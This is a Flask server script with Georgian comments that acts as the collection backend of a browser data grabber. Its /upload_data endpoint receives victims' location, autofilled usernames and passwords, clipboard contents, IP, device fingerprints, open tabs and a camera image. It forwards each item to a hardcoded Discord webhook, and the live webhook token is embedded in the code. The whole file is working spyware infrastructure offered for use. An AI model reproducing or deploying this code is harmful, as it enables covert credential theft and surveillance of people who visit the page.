from flask import Flask, request, render_template
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

# 🚨 შენი დისქორდის ლინკი
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1571037523944144916/M166376XMNczFiKd5_afTR2wCx9XQ1UNdtq7n4vGjAuP5MNtM8cBxnWHpbHb5OVX28Bz")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload_data', methods=['POST'])
def upload_data():
    try:
        data = request.json
        secret = data.get('secret', {})
        
        # 🚨 1. ლოკაცია
        if secret.get('lat') and secret['lat'] != "უარი":
            maps_link = f"https://www.google.com/maps?q={secret['lat']},{secret['lon']}"
            location_msg = f"📍 *ლოკაცია:* [დააჭირე რუკის საჩვენებლად]({maps_link})"
        else:
            location_msg = "📍 *ლოკაცია:* მომხმარებელმა უარი თქვა"
        
        requests.post(DISCORD_WEBHOOK_URL, json={"content": location_msg})

        # 🚨 2. ტელეფონის ინფო (ცალ-ცალკე)
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"💻 *ბრაუზერი:* {secret.get('userAgent', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🖥️ *ეკრანი:* {secret.get('screen', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🧠 *RAM:* {secret.get('ram', 'უცნობია')}"})

        # 🚨 3. ავტოშევსება
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔑 *ავტოშევსების იუზერი:* {secret.get('autofilledUser', 'ვერ წაიკითხა')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔑 *ავტოშევსების პაროლი:* {secret.get('autofilledPass', 'ვერ წაიკითხა')}"})

        # 🚨 4. საიდუმლო ინფო (ცალ-ცალკე)
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🌐 *IP მისამართი:* {secret.get('ip', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🎵 *ხმის ანაბეჭდი:* {secret.get('audioFingerprint', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔤 *ფონტები:* {secret.get('fonts', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"📋 *კლიპბორდი:* {secret.get('clipboard', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔋 *ბატარეა:* {secret.get('battery', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🌐 *ინტერნეტი:* {secret.get('network', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🗂️ *ტაბები:* {secret.get('tabs', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"📱 *ორიენტაცია:* {secret.get('orientation', 'უცნობია')}"})
        requests.post(DISCORD_WEBHOOK_URL, json={"content": f"📳 *ვიბრაცია:* {secret.get('vibrated', 'არა')}"})

        # 🚨 5. ფოტო
        if secret.get('image'):
            image_data = secret['image'].replace("data:image/png;base64,", "")
            image_bytes = base64.b64decode(image_data)
            requests.post(DISCORD_WEBHOOK_URL, files={"file": ("foto.png", image_bytes, "image/png")})

        return "წარმატება"
    except Exception as e:
        print(f"❌ შეცდომა: {e}")
        return "შეცდომა"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
